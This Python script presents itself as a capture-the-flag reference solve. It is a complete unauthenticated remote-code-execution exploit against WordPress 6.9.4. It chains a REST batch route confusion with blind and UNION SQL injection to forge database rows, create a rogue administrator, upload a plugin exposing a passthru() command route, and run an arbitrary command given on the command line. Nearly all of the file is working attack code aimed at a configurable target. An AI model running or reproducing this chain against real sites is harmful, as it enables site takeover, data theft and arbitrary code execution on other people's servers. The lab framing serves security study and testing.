#!/usr/bin/env python3
"""Reference solve for the 'wordpress' challenge (wp2shell).

Unauthenticated RCE chain against stock WordPress 6.9.4:

  CVE-2026-63030  REST /batch/v1 route confusion — a double-nested batch
                  desyncs the sub-request dispatch so a nested 'requests'
                  body is treated as top-level batch entries.
  CVE-2026-60137  WP_Query 'author__not_in' not sanitised — through the
                  confusion, an untrusted 'author_exclude' query param
                  reaches author__not_in raw (UNION ALL SELECT row forgery).

Chain: blind/UNION SQLi -> forged wp_posts rows (oEmbed seeds,
customize_changeset, parse_request re-entry) -> POST /wp/v2/users dispatched
in the extracted admin's context -> new administrator -> plugin upload ->
one-shot passthru() REST route -> command execution.

The command used here is `cat /etc/lab_flag`: the flag is materialized
outside the web root and the DB user has no FILE privilege, so only the RCE
can read it. The flag is printed to stdout (verify gate: exit 0 + flag{).

Target: env TARGET_URL (default http://wordpress.chal.deti:8084) or argv[1].
Stdlib only. Adapted from the public wp2shell PoC
(https://github.com/sergiointel/wp2shell-poc); the stock PoC follows wp-admin
links verbatim; norm_url() re-bases any link/redirect whose siteurl (the
site's own DNS name, http://wordpress.chal.deti:8084 — the name WordPress's
oEmbed self-fetches rely on) differs from the external target, so the solve
also works against a local test container under a different host:port.
"""
import base64
import hashlib
import html
import io
import json
import os
import re
import secrets
import statistics
import sys
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from http.cookiejar import CookieJar

if len(sys.argv) > 1:
    _base = sys.argv[1]
else:
    _base = os.environ.get("TARGET_URL", "http://wordpress.chal.deti:8084")
BASE_URL = _base.rstrip("/")
BATCH_URL = f"{BASE_URL}/?rest_route=/batch/v1"
COMMAND = sys.argv[2] if len(sys.argv) > 2 else "cat /etc/lab_flag"


def say(msg: str) -> None:
    print(msg, file=sys.stderr, flush=True)


def norm_url(url: str) -> str:
    """Re-base a wp-admin URL onto the external target.

    Links/Location headers are built from the site's siteurl (its own DNS
    name) — following them verbatim breaks when the target is reached under
    a different host:port (e.g. a local test container). Keep only the path
    and query; the scheme/host/port must come from the target.
    """
    parsed = urllib.parse.urlsplit(html.unescape(url))
    if parsed.scheme in ("http", "https"):
        target = urllib.parse.urlsplit(BASE_URL)
        return urllib.parse.urlunsplit(
            (target.scheme, target.netloc, parsed.path or "/", parsed.query, "")
        )
    return urllib.parse.urljoin(BASE_URL + "/", url)


def http_open(req, timeout=60):
    return urllib.request.urlopen(req, timeout=timeout)


def send_batch(requests, timeout=30):
    request = urllib.request.Request(
        BATCH_URL,
        data=json.dumps(
            {
                "requests": [
                    {"method": "POST", "path": "http://:"},
                    {
                        "method": "POST",
                        "path": "/wp/v2/posts",
                        "body": {"requests": requests},
                    },
                    {"method": "POST", "path": "/batch/v1"},
                ]
            }
        ).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with http_open(request, timeout) as response:
        return response.read()


SLEEP_DELAY = 0.4


def probetime(condition: str) -> float:
    started = time.perf_counter()
    send_batch(
        [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?"
                + urllib.parse.urlencode(
                    {"author_exclude": f"SELECT IF(({condition}),SLEEP({SLEEP_DELAY}),0)"}
                ),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ],
        10,
    )
    return time.perf_counter() - started


def calibrate():
    """Desync the batch handlers and push the delay above current jitter."""
    global SLEEP_DELAY
    for _ in range(3):
        fast = statistics.median([probetime("1=0") for _ in range(5)])
        slow = statistics.median([probetime("1=1") for _ in range(3)])
        jitter = statistics.median([abs(s - fast) for s in [probetime("1=0") for _ in range(3)]])
        if slow - fast > max(0.06, jitter * 8):
            return (fast + slow) / 2, max(0.02, jitter * 3)
        SLEEP_DELAY *= 2
    raise SystemExit("[-] not vulnerable (timing differential never separated)")


def iscondtrue(condition: str, threshold: float, band: float) -> bool:
    elapsed = probetime(condition)
    if abs(elapsed - threshold) > band:
        return elapsed > threshold
    return statistics.median([elapsed, probetime(condition), probetime(condition)]) > threshold


def getscalar(query: str, max_length: int, threshold: float, band: float) -> str:
    expression = f"COALESCE(({query}),'')"
    lower, upper = 0, max_length
    while lower < upper:
        middle = (lower + upper + 1) // 2
        if iscondtrue(f"CHAR_LENGTH({expression}) >= {middle}", threshold, band):
            lower = middle
        else:
            upper = middle - 1
    result = ""
    for position in range(1, lower + 1):
        lower_byte, upper_byte = 32, 126
        while lower_byte < upper_byte:
            middle = (lower_byte + upper_byte + 1) // 2
            if iscondtrue(
                f"ASCII(SUBSTRING({expression},{position},1)) >= {middle}", threshold, band
            ):
                lower_byte = middle
            else:
                upper_byte = middle - 1
        result += chr(lower_byte)
    return result


def getint(query: str, threshold: float, band: float) -> int:
    expression = f"COALESCE(({query}),0)"
    lower, upper = 0, 1
    while iscondtrue(f"{expression} >= {upper}", threshold, band):
        lower, upper = upper, upper * 2
    while lower < upper:
        middle = (lower + upper + 1) // 2
        if iscondtrue(f"{expression} >= {middle}", threshold, band):
            lower = middle
        else:
            upper = middle - 1
    return lower


def sql_hex(value: str) -> str:
    return f"0x{value.encode().hex()}" if value else "''"


def post_row(post_id, content, title, status, name, parent, post_type):
    return ",".join(
        (
            str(post_id),
            "1",
            sql_hex("2020-01-01 00:00:00"),
            sql_hex("2020-01-01 00:00:00"),
            sql_hex(content),
            sql_hex(title),
            "''",
            sql_hex(status),
            sql_hex("closed"),
            sql_hex("closed"),
            "''",
            sql_hex(name),
            "''",
            "''",
            sql_hex("2020-01-01 00:00:00"),
            sql_hex("2020-01-01 00:00:00"),
            "''",
            str(parent),
            "''",
            "0",
            sql_hex(post_type),
            "''",
            "0",
        )
    )


class _NormRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Follow redirects, re-basing Location onto the target (siteurl is the
    site's own DNS name, so verbatim Location headers break when the target
    is reached under a different host:port).

    Loop detection is required: the FRONT controller 301-canonicalizes
    nonexistent front pages (e.g. /plugins.php <-> /plugins.php/), and a
    handler without the stdlib's redirect accounting would recurse until
    the stack limit instead of failing."""

    def http_error_302(self, req, fp, code, msg, headers):
        newurl = headers.get("Location", "")
        if not newurl:
            return None
        newurl = norm_url(newurl)
        if not hasattr(req, "redirect_dict"):
            req.redirect_dict = {}
        req.redirect_dict[newurl] = req.redirect_dict.get(newurl, 0) + 1
        if req.redirect_dict[newurl] > self.max_repeats:
            raise RuntimeError(f"redirect loop at {newurl}")
        new_req = urllib.request.Request(
            newurl, headers={"Host": req.host}, method=req.method
        )
        new_req.redirect_dict = req.redirect_dict
        return self.parent.open(new_req, timeout=req.timeout)

    http_error_301 = http_error_303 = http_error_307 = http_error_302


def main():
    global SLEEP_DELAY
    say("[*] calibrating timing oracle ...")
    threshold, band = calibrate()
    say(f"[+] timing oracle armed (sleep={SLEEP_DELAY}s)")

    with http_open(
        urllib.request.Request(f"{BASE_URL}/?rest_route=/wp/v2/posts&per_page=1&_fields=link"),
        15,
    ) as response:
        published_items = json.loads(response.read())
    if not published_items or not published_items[0].get("link"):
        raise SystemExit("[-] no published post (oEmbed seed base)")
    say("[+] published post found: " + published_items[0]["link"])

    # Seed 3 oEmbed posts so the forged cache objects have database backing.
    token = secrets.token_hex(6)
    public_post = urllib.parse.urlsplit(published_items[0]["link"])
    embed_urls = [
        urllib.parse.urlunsplit(
            (
                public_post.scheme,
                public_post.netloc,
                public_post.path,
                public_post.query,
                f"{token}{index}",
            )
        )
        for index in range(3)
    ]
    seed_content = "".join(
        f'[embed width="500" height="750"]{embed_url}[/embed]' for embed_url in embed_urls
    )
    seed_query = (
        "1) AND 1=0 UNION ALL SELECT "
        + post_row(0, seed_content, "seed", "publish", "seed", 0, "post")
        + " -- -"
    )
    say("[*] seeding oEmbed caches ...")
    send_batch(
        [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/widgets?"
                + urllib.parse.urlencode(
                    {
                        "author_exclude": seed_query,
                        "per_page": -1,
                        "orderby": "none",
                        "context": "view",
                    }
                ),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ],
        60,
    )

    say("[*] extracting posts table ...")
    posts_table = getscalar(
        "SELECT TABLE_NAME "
        "FROM INFORMATION_SCHEMA.TABLES "
        "WHERE TABLE_SCHEMA=DATABASE() "
        "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
        "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
        64,
        threshold,
        band,
    )
    if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
        raise SystemExit("[-] table extraction failed")
    say(f"[+] posts table: {posts_table}")

    say("[*] extracting admin user id ...")
    table_prefix = posts_table[:-5]
    admin_id = getint(
        f"SELECT u.ID FROM `{table_prefix}users` u "
        f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
        "WHERE m.meta_key=" + sql_hex(table_prefix + "capabilities")
        + " AND INSTR(m.meta_value," + sql_hex('s:13:"administrator";b:1;') + ")>0 "
        "ORDER BY u.ID LIMIT 1",
        threshold,
        band,
    )
    if admin_id < 1:
        raise SystemExit("[-] admin extraction failed")
    say(f"[+] admin id: {admin_id}")

    say("[*] recovering oEmbed cache post ids ...")
    embedsize = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
    cache_post_ids = []
    for embed_url in embed_urls:
        cache_key = hashlib.md5((embed_url + embedsize).encode()).hexdigest()
        cache_post_id = getint(
            f"SELECT ID FROM `{posts_table}` "
            "WHERE post_type=0x6f656d6265645f6361636865 "
            f"AND post_name=0x{cache_key.encode().hex()} "
            "ORDER BY ID DESC LIMIT 1",
            threshold,
            band,
        )
        if cache_post_id < 1:
            raise SystemExit("[-] oEmbed cache row missing (self oEmbed fetch failed?)")
        cache_post_ids.append(cache_post_id)
    if len(set(cache_post_ids)) != 3:
        raise SystemExit("[-] oEmbed cache rows not distinct")
    say(f"[+] cache ids: {cache_post_ids}")

    username = f"w2s_{token}"
    password = f"W2s!{secrets.token_urlsafe(15)}"
    email = f"{username}@wp2shell.example"
    outer_loop_id = 1800000000 + secrets.randbelow(100000000)
    nav_item_id = outer_loop_id + 1
    inner_loop_id = outer_loop_id + 2

    changeset = json.dumps(
        {
            f"nav_menu_item[{nav_item_id}]": {
                "value": {
                    "object_id": 0,
                    "object": "",
                    "menu_item_parent": 0,
                    "position": 0,
                    "type": "custom",
                    "title": "proof",
                    "url": "https://github.com/sergiointel/wp2shell-poc",
                    "target": "",
                    "attr_title": "",
                    "description": "proof",
                    "classes": "",
                    "xfn": "",
                    "status": "publish",
                    "nav_menu_term_id": 0,
                    "_invalid": False,
                },
                "type": "nav_menu_item",
                "user_id": admin_id,
            }
        },
        separators=(",", ":"),
    )

    poisoned_posts = (
        post_row(0, f'[embed width="500" height="750"]{embed_urls[1]}[/embed]', "trigger", "publish", "trigger", 0, "post"),
        post_row(cache_post_ids[0], changeset, "changeset", "future", str(uuid.uuid4()), outer_loop_id, "customize_changeset"),
        post_row(outer_loop_id, "outer", "outer", "draft", "outer", cache_post_ids[0], "post"),
        post_row(cache_post_ids[1], "", "cache", "publish", "cache", cache_post_ids[0], "post"),
        post_row(nav_item_id, "nav", "nav", "publish", "nav", cache_post_ids[2], "nav_menu_item"),
        post_row(cache_post_ids[2], "parse", "parse", "parse", "parse", inner_loop_id, "request"),
        post_row(inner_loop_id, "inner", "inner", "draft", "inner", cache_post_ids[2], "post"),
    )
    escalation_query = (
        "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(poisoned_posts) + " -- -"
    )
    new_admin = {
        "username": username,
        "email": email,
        "password": password,
        "roles": ["administrator"],
    }

    say("[*] forging changeset + re-entry, creating administrator ...")
    send_batch(
        [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/widgets?"
                + urllib.parse.urlencode(
                    {
                        "author_exclude": escalation_query,
                        "per_page": -1,
                        "orderby": "none",
                        "context": "view",
                    }
                ),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ],
        60,
    )

    say("[*] logging in as forged admin ...")
    session = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(CookieJar()), _NormRedirectHandler()
    )
    session.open(f"{BASE_URL}/wp-login.php", timeout=15).read()
    login_request = urllib.request.Request(
        f"{BASE_URL}/wp-login.php",
        data=urllib.parse.urlencode(
            {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{BASE_URL}/wp-admin/",
                "testcookie": "1",
            }
        ).encode(),
        method="POST",
    )
    session.open(login_request, timeout=30).read()
    with session.open(f"{BASE_URL}/wp-admin/users.php", timeout=30) as response:
        users_page = response.read().decode(errors="replace")
    if username not in users_page:
        raise SystemExit("[-] forged admin login failed")
    say("[+] administrator created and logged in")

    say("[*] uploading one-shot command plugin ...")
    plugin_slug = f"w2s-{token}"
    command_route = secrets.token_hex(12)
    command_marker = secrets.token_hex(12)
    plugin_source = f"""<?php
/* Plugin Name: {plugin_slug} */
add_action('rest_api_init', function () {{
    register_rest_route('wp2shell/v1', '/{command_route}', array(
        'methods' => 'POST',
        'permission_callback' => '__return_true',
        'callback' => function ($request) {{
            ob_start();
            passthru(base64_decode($request->get_param('c')) . ' 2>&1');
            $output = ob_get_clean();
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
            deactivate_plugins(plugin_basename(__FILE__), true);
            @unlink(__FILE__);
            return new WP_REST_Response(array(
                'marker' => '{command_marker}',
                'output' => $output,
            ));
        }},
    ));
}});
""".encode()

    plugin_zip = io.BytesIO()
    with zipfile.ZipFile(plugin_zip, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(f"{plugin_slug}/{plugin_slug}.php", plugin_source)

    with session.open(f"{BASE_URL}/wp-admin/plugin-install.php?tab=upload", timeout=30) as response:
        upload_page = response.read().decode(errors="replace")
    nonce = re.search(r'name="_wpnonce" value="([^"]+)"', upload_page)
    if not nonce:
        raise SystemExit("[-] upload nonce not found")
    boundary = f"----wp2shell{secrets.token_hex(12)}"
    multipart = b"".join(
        (
            (
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n'
                f"{nonce.group(1)}\r\n"
            ).encode(),
            (
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="_wp_http_referer"\r\n\r\n'
                "/wp-admin/plugin-install.php?tab=upload\r\n"
            ).encode(),
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="pluginzip"; filename="{plugin_slug}.zip"\r\n'
                "Content-Type: application/zip\r\n\r\n"
            ).encode(),
            plugin_zip.getvalue(),
            f"\r\n--{boundary}--\r\n".encode(),
        )
    )
    upload_request = urllib.request.Request(
        f"{BASE_URL}/wp-admin/update.php?action=upload-plugin",
        data=multipart,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    with session.open(upload_request, timeout=60) as response:
        install_page = response.read().decode(errors="replace")
    activation_link = re.search(r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
    if not activation_link:
        raise SystemExit("[-] activation link not found")
    # The upload response page is served from /wp-admin/update.php, so a
    # relative plugins.php? href resolves against /wp-admin/ — resolving it
    # against the site base would hit the FRONT controller, which 301-loops
    # on the nonexistent front page. Re-base the result onto the target
    # (siteurl is the site's own DNS name).
    activation_url = urllib.parse.urljoin(
        f"{BASE_URL}/wp-admin/", html.unescape(activation_link.group(1))
    )
    session.open(norm_url(activation_url), timeout=30).read()

    say("[*] executing: " + COMMAND)
    command_request = urllib.request.Request(
        f"{BASE_URL}/?rest_route=/wp2shell/v1/{command_route}",
        data=json.dumps({"c": base64.b64encode(COMMAND.encode()).decode()}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with http_open(command_request, timeout=60) as response:
        command_result = json.loads(response.read())
    if command_marker not in json.dumps(command_result):
        raise SystemExit("[-] command route not confirmed")
    output = command_result.get("output", "")
    say("[+] RCE confirmed, output:")
    print(output)


if __name__ == "__main__":
    main()
